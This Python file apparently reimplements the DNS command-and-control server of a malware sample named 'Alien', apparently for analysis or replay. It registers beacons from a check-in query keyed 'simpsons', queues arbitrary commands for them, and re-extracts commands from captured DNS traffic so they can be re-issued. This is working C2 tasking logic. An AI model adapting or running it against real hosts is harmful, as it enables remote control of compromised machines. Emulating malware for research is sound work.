import logging
import math
import random
import socket

from Alien.beacon import AlienBeacon
from Alien.utilities.communication import BeaconResult, DnsPair, ResultCodes
from Alien.utilities.encodings import BASE32_ALPHABET_OF_SAMPLE, decode_str_into_int

FIRSTALIVEKEY = "simpsons"

LENGTH_OF_FIRST_KEY = len(FIRSTALIVEKEY) + 1

logger = logging.getLogger("dns_c2")

class Alien:
    def __init__(self, c2_domains):
        self.c2_domains = c2_domains
        self.beacons = []
        self.commands_upon_checkin = []

    def log(self, message, loglevel=logging.INFO):
        logger.log(level=loglevel, msg=f"[Alien] {message}")

    def add_beacon(self, beacon: AlienBeacon):
        self.log(f"Beacon check-in (ID {beacon.id})")
        self.beacons.append(beacon)
        for command in self.commands_upon_checkin:
            self.schedule_task(beacon.id, command)

    def handle_command_result(self, beacon, data):
        self.log(f"[Beacon {beacon.id}] : {data}")

    def schedule_task_for_new_beacons(self, command):
        self.commands_upon_checkin.append(command)

    def schedule_task(self, beacon_id, command):
        beacon = next((b for b in self.beacons if b.id == beacon_id), None)
        if beacon is not None:
            beacon.command_queue.append(command)
            self.log(
                f"Tasked beacon {beacon_id} with command "
                f"{command!r}",
            )
            return True

        self.log(f"Could not schedule task for beacon {beacon_id}: not found.", logging.WARNING)
        return False

    def parse_dns_request(self, qname):
        data = qname.split(".")[0]
        response = False
        responding_beacon = None
        for beacon in self.beacons:
            response = beacon.process_request(data)
            if response is not False:
                responding_beacon = beacon
                break

        if response is False:
            ip_address = self.parse_firstalive_request(data)
        else:
            ip_address = response.ip_address
            result = response.beacon_result
            if result is not None:
                self.handle_beacon_result(responding_beacon, result)
        return ip_address

    def parse_firstalive_request(self, qname):
        counter = decode_str_into_int(qname[LENGTH_OF_FIRST_KEY:], BASE32_ALPHABET_OF_SAMPLE)
        if counter is None:
            raise ValueError(
                (
                    "Could not decode firstalive request. Are you certain this beacon is coming up for the first time? "
                    "This script does not support a beacon resuming a previous state. Be sure to delete the 'cnf' file "
                    "in between runs.",
                )
            )
        self.log(f"Beacon counter: {counter}", loglevel=logging.DEBUG)

        beacon_id = len(self.beacons) + 80

        beacon = AlienBeacon(beacon_id, counter)
        self.add_beacon(beacon)

        beacon.update_counter()

        response = ""
        for _ in range(3):
            response += f"1{random.randrange(10, 99)}."
        response += str(beacon_id)

        return response

    def prepare_for_replay(self, dns_pairs):
        unique_pairs = []
        for new_pair in dns_pairs:
            exists_already = False
            for existing_pair in unique_pairs:
                if existing_pair.rdata == new_pair.rdata:
                    exists_already = True
            if not exists_already:
                unique_pairs.append(new_pair)

        self.log("Parsing sent commands out of replay input...")
        assumption_command_size_announcement_contains = ".0.0."
        for index, pair in enumerate(unique_pairs):
            if pair.rdata is None:
                continue
            if assumption_command_size_announcement_contains in pair.rdata:
                command_size = int.from_bytes(socket.inet_aton(pair.rdata)[1:], "big")
                number_of_packets_needed = math.ceil(command_size / 4)

                pairs_containing_command = unique_pairs[index + 1 : index + 1 + number_of_packets_needed]
                command_to_send = b""
                for command_pair in pairs_containing_command:
                    chars = command_pair.rdata.split(".")
                    for char in chars:
                        if len(command_to_send) < command_size:
                            command_to_send += int(char).to_bytes(1, "little")

                command_to_send = command_to_send[1:]

                command_to_send = command_to_send.decode("utf-8")
                self.log(f"Parsed command: {command_to_send}", logging.DEBUG)
                self.schedule_task_for_new_beacons(command_to_send)